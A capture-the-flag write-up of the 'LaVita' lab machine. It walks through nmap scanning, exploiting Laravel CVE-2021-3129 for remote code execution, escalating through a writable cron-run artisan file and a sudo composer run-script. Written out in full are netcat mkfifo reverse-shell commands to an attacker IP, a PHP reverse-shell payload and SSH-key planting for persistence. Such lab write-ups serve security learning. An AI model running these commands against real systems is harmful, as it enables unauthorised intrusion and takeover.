LaVita

Target IP: 192.168.105.38
Challenge Description: Originally part of the CTF-Labor Challenge. This is the CTF-Labor-200-07.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.105.38 -p- returns the result shown in the image above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports.


Running an aggressive scan against the two open TCP ports using the command sudo nmap -sV -A 192.168.105.38 -p 22,80 returns the result shown in the image above. The target machine is running OpenSSH 8.4p1 SSH application on port 22. The web application seems to be using Apache httpd 2.4.56 as the server. The title of the web application is W3.CSS.

Enumeration

Port 80: HTTP

The webpage above is returned for this web application on port 80. I viewed the source-code of the webpage but I didn't find anything. There are multiple accessible pages. I clicked the Demo button after hoovering over the Dropdown.


This redirected me to the login webpage as shown in the picture above. However, I do not have any credentials right now. I notice there is Register button too. Maybe I can create an account?


The Register feature works. Using this page, I created a new test account with the credentials test:tester1234. Then I logged in and the webpage shown in the picture above was returned to me. Right away, I notice the APP_DEBUG feature. I can enable it. There is also a Image Upload feature. I enabled this feature and uploaded a picture, but it didn't get uploaded. What application version is it? On the main webpage, it mentions the application is built around Laravel developers.


I tried to navigate to a non-existing directory such as http://192.168.105.38/idkwtf and the error webpage shown in the picture above was returned to me. It seems like the target machine is running Laravel 8.4.0. So far, it seems like the web application allows APP_DEBUG mode and it is currently running on Laravel 8.4.0. With this information now, I can look for any public exploits.

Exploitation

Owning the Laravel 8.4.2 (CVE-2021-3129) via RCE

When looking for Laravel 8.4.0 vulnerabilities, I came across the vulnerability Remote Code Execution: Laravel (CVE-2021-3129). Remote Code Execution (RCE) is possible due to the APP_DEBUG mode on the backend server. Moreover, it is possible to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This technical website explains the vulnerability in depth. I downloaded the exploit from this GitHub repository. Time to test it. I followed the instruction underneath the Installation section to setup the exploit.


I ran the exploit using the command python3 CVE-2021-3129.py --host http://192.168.105.38 --exec whoami and got a hit as shown in the image above. I had to try the next chain in order to get the output. Now I can attempt to obtain a reverse shell connection.


I started a listener on my machine at port 8443. Then I ran the command python3 CVE-2021-3129.py --host http://192.168.105.38 --exec 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.206 8443 >/tmp/f' to obtain a reverse shell connection on my machine at port 8443. The first chain did not work. So I used the next chain. And I instantly obtained a reverse shell connection with the session as www-data on the server, as shown on the bottom terminal in the picture above.

Privilege Escalation

Horizontal Privilege Escalation: User www-data to User skunk via Cron Job Misconfiguration

I transferred pspy64 to the target machine to check for any active cronjobs. And there is an active cronjob /bin/sh -c /usr/bin/php /var/www/html/lavita/artisan clear:pictures that stands out me, as shown in the picture above. It seems to be calling the /var/www/html/lavita/artisan file. Do I have write privileges? What is this script doing?


I notice the artisan is a PHP file. I can replace the content of it with a reverse shell connection, as I have write privileges.


I started a listener on my machine at port 8444. Then I ran the following commands to insert a PHP reverse shell inside this file artisan:

echo '#!/usr/bin/env' > /var/www/html/lavita/artisan
echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.206 8444>/tmp/f'); ?>" >> /var/www/html/lavita/artisan
echo '#!/usr/bin/env' > /var/www/html/lavita/artisan
echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.206 8444>/tmp/f'); ?>" >> /var/www/html/lavita/artisan

After replacing the file contents with my PHP reverse shell, I used the command chmod +x artisan to make it executable. And after some time, I obtained a reverse shell connection on my machine at port 8444 with the session as skunk as shown in the picture above on the bottom terminal. I successfully elevated my privileges from the user www-data to user skunk. Since I have compromised an user account and the SSH is open, I can now obtain a stable foothold on the target machine by placing my SSH key inside this user's SSH key directory.


In the picture above on the right terminal, I generated a new SSH key pair using the command ssh-keygen with the name skunk. The skunk.pub contains the key ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+km5Z2Td9Z/D1S1gAFywcLj+RPtjBYjuFlfaLNd9C+ kali@kali. Then I changed the permission of the SSH key of skunk to 400 using the command chmod 400 skunk. In the reverse shell connection session, in the image above on the left terminal, I ran the command echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO+km5Z2Td9Z/D1S1gAFywcLj+RPtjBYjuFlfaLNd9C+ kali@kali' > authorized_keys to place my SSH key inside the .ssh directory of user skunk. Afterwards, I logged into the server as the user skunk with my SSH key using the command ssh skunk@192.168.105.38 -i skunk. Now I have a stable SSH foothold access to the target machine :)

Vertical Privilege Escalation: User skunk to User root via /usr/bin/composer Misconfiguration

Running the command sudo -l shows the command /usr/bin/composer --working-dir\=/var/www/html/lavita * can be executed as the user root without having to enter password. This looks similar to tar Wildcard Injection due to the *. Let's find out what this does. Upon reading the documentation of composer found here, the flag --wordking-dir is used to specify where the composer is executed from. We can abuse this by passing in run-script to run the script of our choice. Since the composer is being run as root, we can easily obtain a root level shell access. One issue: the user skunk cannot make any changes to the files in the /var/www/lavita directory. Therefore, we require two sessions: one using www-data to plant our malicious script and another using skunk to execute the script.


In the image above, there are two terminals. The top terminal is where I can www-data shell access to the target machine. With this shell access, I browsed to /var/www/html/lavita first. Then I ran the following commands to create the malicious script to upgrade our shell access from skunk to root:

TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json

And again, in the image above, on the bottom terminal is where I execute the command sudo -u root /usr/bin/composer --working-dir=/var/www/html/lavita run-script x. This command upgrades the current shell to a root shell by executing the payload by the name x inside scripts. And doing so, landed me a root shell on the target machine :)
